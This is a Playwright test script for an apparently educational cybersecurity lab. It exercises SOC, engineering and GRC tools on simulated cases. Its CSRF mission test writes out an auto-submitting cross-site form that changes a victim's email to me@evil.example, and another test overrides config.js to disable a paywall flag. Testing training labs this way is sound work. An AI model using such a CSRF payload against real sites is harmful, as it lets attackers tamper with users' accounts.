import functools
import socketserver
import sys
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import browser_soc as B

check, msg, mount = B.check, B.msg, B.mount


def click_wait(page, sel, until, timeout=60000):
    page.click(sel)
    page.wait_for_function("(re) => new RegExp(re).test(document.querySelector('[data-r=msg]').textContent)", arg=until, timeout=timeout)
    return msg(page)


def ir(page, cases):
    mount(page, "timeline", cases["phish"])
    page.fill('[data-r="q"]', "hr-pc07")
    page.click('[data-r="go"]')
    page.locator(".tt-star").first.click()
    m = click_wait(page, '[data-r="done"]', "key events from")
    check("1 key events from 2026-11-02" in m, f"the timeline merges logs, keeps real times and saves starred events ({m[:90]})")
    mount(page, "proctree", cases["quietdns"])
    m = msg(page)
    check("with warnings" in m and page.locator(".tr-flag").count() >= 2, f"the process tree flags the downloaded program ({m[:90]})")
    mount(page, "hex", cases["web01"])
    page.select_option('[data-r="file"]', "suspect/kworkerd")
    m = click_wait(page, '[data-r="hash"]', "Hashed")
    check("SHA-256" in page.inner_text('[data-r="hashes"]'), "the hex tool hashes a file")
    page.fill('[data-r="by"]', "Analyst A")
    page.click('[data-r="log"]')
    check(page.inner_text('[data-r="cn"]') == "1", "the custody log records the hash and who handled it")
    mount(page, "tabletop", cases["ddos"])
    for _ in range(5):
        if page.locator(".tb-ch").count():
            page.locator(".tb-ch").first.click()
    check("Score 8 of 8" in page.inner_text('[data-r="scene"]'), "the best path through the DDoS tabletop scores full marks")
    mount(page, "report", cases["phish"])
    page.select_option('[data-r="tpl"]', "roe")
    m = click_wait(page, '[data-r="check"]', "sections are complete")
    check("0 of 7" in m, f"an empty rules of engagement is flagged as incomplete ({m})")


def eng(page, cases):
    mount(page, "firewall", cases["web01"])
    check("5 of 5 distinct flows are allowed" in msg(page), f"the saved firewall allows every flow, including the C2 ({msg(page)[:80]})")
    rules = page.input_value('[data-r="rules"]').replace("allow tcp dmz -> internet:any", "allow tcp dmz -> internet:443")
    page.fill('[data-r="rules"]', rules)
    page.click('[data-r="go"]')
    check("3 of 5" in msg(page), f"tightening outbound rules blocks the C2 port ({msg(page)[:80]})")
    mount(page, "ids", cases["quietdns"])
    m = click_wait(page, '[data-r="go"]', "alert")
    check("sid 1000002" in m, f"the example IDS rule catches the DNS tunnel ({m[:100]})")
    mount(page, "harden", cases["web01"])
    m = click_wait(page, '[data-r="go"]', "checks pass")
    check("fail" in m, f"the hardening audit finds weak settings ({m[:90]})")
    page.select_option('[data-r="file"]', "config/sshd_config")
    page.fill('[data-r="text"]', page.input_value('[data-r="text"]').replace("PermitRootLogin yes", "PermitRootLogin no"))
    m2 = click_wait(page, '[data-r="go"]', "checks pass")
    check(int(m2.split(" of ")[0]) == int(m.split(" of ")[0]) + 1, "fixing one sshd setting passes one more check")
    mount(page, "patch", cases["web01"])
    page.fill('[data-r="vec"]', "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H")
    page.click('[data-r="read"]')
    check(page.inner_text('[data-r="score"]').startswith("8.8"), "the CVSS calculator gives EternalBlue's 8.8")
    page.click('[data-r="rank"]')
    check("LAB-2026-0101" in page.locator('[data-r="list"] tr').nth(1).inner_text(), "the exploited, internet-facing upload bug ranks first")
    mount(page, "identity", cases["insider"])
    page.click('[data-t="paths"]')
    page.select_option('[data-r="goal"]', "dc01")
    page.click('[data-r="find"]')
    check("6 steps" in msg(page), f"r.menon has a 6-step path to the domain controller ({msg(page)[:90]})")
    mount(page, "mailauth", cases["phish"])
    page.select_option('[data-r="mail"]', "reported/password-expiry.eml")
    m = click_wait(page, '[data-r="go"]', "DMARC")
    check("DMARC fail" in m and "reject" in page.inner_text('[data-r="res"]'), "the spoofed IT email fails DMARC and is rejected")
    mount(page, "soar", cases["phish"])
    m = click_wait(page, '[data-r="go"]', "automatic actions")
    check("Isolated: hr-pc07" in m, f"the example playbook isolates the infected PC ({m[:100]})")
    mount(page, "parse", cases["web01"])
    page.select_option('[data-r="file"]', "access.log")
    page.select_option('[data-r="ex"]', "access")
    m = click_wait(page, '[data-r="go"]', "lines parsed")
    check("13 of 13" in m, f"the access log pattern parses every line ({m[:60]})")


def cloud_pen_grc(page, cases):
    mount(page, "cloudiam", cases["cloudkey"])
    m = click_wait(page, '[data-r="replay"]', "would still be allowed")
    check(m.startswith("29 of 30"), f"with the leaked key's policy, every attacker action but the guarded one is allowed ({m[:70]})")
    pol = page.input_value('[data-r="pol"]').replace('{"effect": "Allow", "actions": ["*"], "resources": ["*"]}]}]},\n  {"name": "lina"',
                                                     '{"effect": "Allow", "actions": ["DeployService"], "resources": ["service/mobile-api-*"], "conditions": {"source_ip": ["10.40.0.0/16"]}}]}]},\n  {"name": "lina"', 1)
    page.fill('[data-r="pol"]', pol)
    m = click_wait(page, '[data-r="replay"]', "would still be allowed")
    check(m.startswith("0 of 30") and "0 of 3 normal" in m, f"least privilege stops the attack and keeps normal work ({m[:120]})")
    mount(page, "codescan", cases["cloudkey"])
    m = click_wait(page, '[data-r="go"]', "secrets")
    check("8 secrets" in m and "4 vulnerable packages" in m, f"the scanner finds secrets, packages and config problems ({m})")
    mount(page, "jwt", cases["web01"])
    m = click_wait(page, '[data-r="guess"]', "Found it|None of")
    check("nimbumart" in m, f"the JWT secret falls to a wordlist ({m[:80]})")
    mount(page, "regex", cases["web01"])
    page.select_option('[data-r="file"]', "auth.log")
    page.fill('[data-r="pat"]', r"Failed password for (?:invalid user )?(\S+) from (\S+)")
    m = click_wait(page, '[data-r="go"]', "match")
    check(m.startswith("7 matches"), f"the regex finds the 7 failed logins ({m[:40]})")
    page.fill('[data-r="pat"]', "(a+)+$")
    page.click('[data-r="go"]')
    check("catastrophic" in page.inner_text('[data-r="warn"]'), "a ReDoS-prone pattern is warned about")
    mount(page, "crack", cases["web01"])
    m = click_wait(page, '[data-r="go"]', "Cracked", 120000)
    check(m.startswith("Cracked 4 of 5"), f"four weak passwords crack and the strong one doesn't ({m[:60]})")
    mount(page, "risk", cases["web01"])
    page.click('[data-r="ex"]')
    m = click_wait(page, '[data-r="done"]', "risks")
    check("3 risks" in m, f"the risk register scores and checks risks ({m[:60]})")
    mount(page, "threatmodel", cases["web01"])
    page.click('[data-t="tree"]')
    page.click('[data-r="solve"]')
    check("costs 3" in page.inner_text('[data-r="tout"]'), "the attack tree finds SQL injection as the cheapest attack")
    mount(page, "compliance", cases["web01"])
    page.select_option('[data-r="fw"]', "certin")
    page.locator('[data-f="s"]').first.select_option("met")
    m = click_wait(page, '[data-r="done"]', "requirements")
    check("1 met" in m and "no evidence" in m, f"a requirement marked met without evidence is called out ({m[:120]})")


def csrf(browser, base):
    page = browser.new_page()
    errors = []
    page.on("pageerror", lambda e: errors.append(str(e)))
    config = (B.SITE / "assets" / "config.js").read_text(encoding="utf-8") + "\nif (window.APCYBER_PAYWALL) window.APCYBER_PAYWALL.enabled = false;\n"
    page.route("**/assets/config.js", lambda route: route.fulfill(status=200, content_type="application/javascript", body=config))
    page.goto(base + "/shop.html")
    page.wait_for_selector(".sh-grid", timeout=60000)
    page.fill("#sh-url", "/#/lab/attacker")
    page.click("#sh-goto")
    page.wait_for_selector("#sh-evil-html")
    page.fill("#sh-evil-html", '<form action="https://nimbu.shop/account/newsletter" method="POST"><input name="email" value="me@evil.example"></form><script>document.forms[0].submit()</script>')
    page.click("[data-csrf]")
    out = page.inner_text("#sh-evil-out")
    check("newsletter email is now me@evil.example" in out and "aayat{" in out, f"the CSRF mission changes Jim's email and shows the flag ({out[:120]})")
    page.fill("#sh-evil-html", '<form action="https://nimbu.shop/account/newsletter" method="GET"><input name="email" value="x@evil.example"></form>')
    page.click("[data-csrf]")
    check("405" in page.inner_text("#sh-evil-out"), "a GET form is refused, so students learn the method matters")
    check("Change Jim's email" in page.inner_text("#sh-missions"), "the CSRF mission is listed")
    check(not errors, f"no page errors on the shop ({errors[:3]})")
    page.close()


def notebook(browser, base):
    page = browser.new_page()
    errors = []
    page.on("pageerror", lambda e: errors.append(str(e)))
    page.goto(base + "/notebook.html?ref=rb-phish&runbook=phish")
    page.wait_for_selector("#pb-dock", state="attached", timeout=60000)
    page.wait_for_function("document.querySelectorAll('#nb-cells .nb-cell').length > 5", timeout=60000)
    text = page.inner_text("body")
    check("Playbook v1.1" in text, "the runbook briefing shows the playbook card")
    page.evaluate("document.querySelector('#pb-dock [data-tab=\"tool-more\"]').click()")
    page.wait_for_selector('#pb-p-tool-more [data-more="sigma"]', timeout=30000)
    groups = page.eval_on_selector_all("#pb-p-tool-more h4", "hs => hs.map(h => h.textContent)")
    check(len(groups) == 6, f"More tools lists the six job paths ({groups})")
    page.click('#pb-p-tool-more [data-more="sigma"]')
    page.wait_for_function("() => { const n = document.querySelector('#pb-p-tool-more [data-r=note]'); return n && /events/.test(n.textContent); }", timeout=60000)
    page.click('#pb-p-tool-more [data-r="go"]')
    check("matched 1 of" in page.inner_text('#pb-p-tool-more [data-r="msg"]'), "a tool opened from More tools works on the runbook's case")
    page.click('#pb-p-tool-more [data-r="save"]')
    page.wait_for_selector('#nb-cells .tool-step[data-tool="sigma"]', timeout=30000)
    check(True, "Add to notebook puts a Sigma step in the runbook")
    check(not errors, f"no page errors on the notebook ({errors[:3]})")
    page.close()


VARIANT = """async () => {
  const m = await AayatVM.manifest('web01');
  const files = await AayatVM.caseFiles('web01');
  const hash = async (s) => Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s)))).map(b => b.toString(16).padStart(2, '0')).join('');
  const text = m.template.map(c => c.s).join('\\n');
  return { v: m.variant, n: m.variantCount, auth: files['auth.log'].includes('203.0.113.91'), old: files['auth.log'].includes('203.0.113.7 '),
    newHash: text.includes(await hash('203.0.113.91')), oldHash: text.includes(await hash('203.0.113.7')), play: JSON.stringify(m.playbook).includes('203.0.113.91') };
}"""


def evidence(browser, base):
    page = browser.new_page()
    page.goto(base + "/notebook.html?ref=rb-web01&runbook=web01&evidence=1")
    page.wait_for_function("document.querySelectorAll('#nb-cells .nb-cell').length > 5", timeout=60000)
    check("evidence set 2 of 3" in page.inner_text("body"), "the briefing says which evidence set the student has")
    r = page.evaluate(VARIANT)
    check(r["v"] == 1 and r["auth"] and not r["old"], f"evidence set 2 has its own attacker address in the logs ({r})")
    check(r["newHash"] and not r["oldHash"], "the answer check expects that set's address, not the original")
    check(r["play"], "the playbook text matches the student's evidence")
    page.goto(base + "/notebook.html?ref=rb-web01b&runbook=web01&evidence=0")
    page.wait_for_function("document.querySelectorAll('#nb-cells .nb-cell').length > 5", timeout=60000)
    check(page.evaluate("AayatVM.caseFiles('web01').then(f => f['auth.log'].includes('203.0.113.7 '))"), "evidence set 1 is the original case")
    page.close()


def main():
    from playwright.sync_api import sync_playwright
    sys.stdout.reconfigure(encoding="utf-8")
    handler = functools.partial(B.Quiet, directory=str(B.SITE))
    with socketserver.ThreadingTCPServer(("127.0.0.1", 0), handler) as server:
        base = f"http://127.0.0.1:{server.server_address[1]}"
        threading.Thread(target=server.serve_forever, daemon=True).start()
        cases = {c: B.case_files(c) for c in ("phish", "web01", "quietdns", "ddos", "insider", "cloudkey")}
        with sync_playwright() as p:
            browser = p.chromium.launch()
            page, errors = B.open_page(browser, base)
            for name, fn in (("Incident responder", ir), ("Security engineer", eng), ("Cloud, testing and GRC", cloud_pen_grc)):
                print(name)
                try:
                    fn(page, cases)
                except Exception as e:
                    check(False, f"{name} ran without an exception ({e.__class__.__name__}: {str(e)[:240]})")
            check(not errors, f"no page errors in the tools ({errors[:3]})")
            print("Hack the shop: CSRF")
            csrf(browser, base)
            print("Evidence per student")
            try:
                evidence(browser, base)
            except Exception as e:
                check(False, f"the evidence check ran ({e.__class__.__name__}: {str(e)[:200]})")
            print("Notebook: playbook and More tools")
            try:
                notebook(browser, base)
            except Exception as e:
                check(False, f"the notebook check ran ({e.__class__.__name__}: {str(e)[:200]})")
            browser.close()
        server.shutdown()
    print(f"\n{len(B.FAILS)} failed" if B.FAILS else "\nall passed")
    return 1 if B.FAILS else 0


if __name__ == "__main__":
    raise SystemExit(main())
